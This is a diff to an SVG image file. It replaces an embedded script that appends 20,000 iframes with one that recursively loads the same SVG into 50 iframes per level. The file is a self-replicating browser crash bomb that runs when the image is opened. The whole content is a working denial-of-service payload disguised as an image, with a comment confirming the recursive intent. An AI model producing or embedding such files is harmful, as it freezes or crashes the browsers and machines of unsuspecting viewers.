@@ -1,14 +1,15 @@
 <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 400">
-  <!-- GUH?????????????? -->
-  <foreignObject width="400" height="400">
-    <div id="blowup" xmlns="http://www.w3.org/1999/xhtml">
-    </div>
-  </foreignObject>
-  <script type="text/javascript"><![CDATA[
-    const div = document.getElementById("blowup")
-    for (let i=0;i<20000;i++){
-      const f = document.createElement("iframe");
-      div.appendChild(f);
-    }
-  ]]></script>
-</svg>
+    <foreignObject width="400" height="400">
+      <div xmlns="http://www.w3.org/1999/xhtml" id="blowup"></div>
+    </foreignObject>
+
+    <script type="text/javascript"><![CDATA[
+      const div = document.getElementById("blowup");
+      // each iframe loads THIS same svg, which spawns more iframes, which load this svg...
+      for (let i = 0; i < 50; i++) {
+        const frame = document.createElement("iframe");
+        frame.src = document.URL;
+        div.appendChild(frame);
+      }
+    ]]></script>
+  </svg>
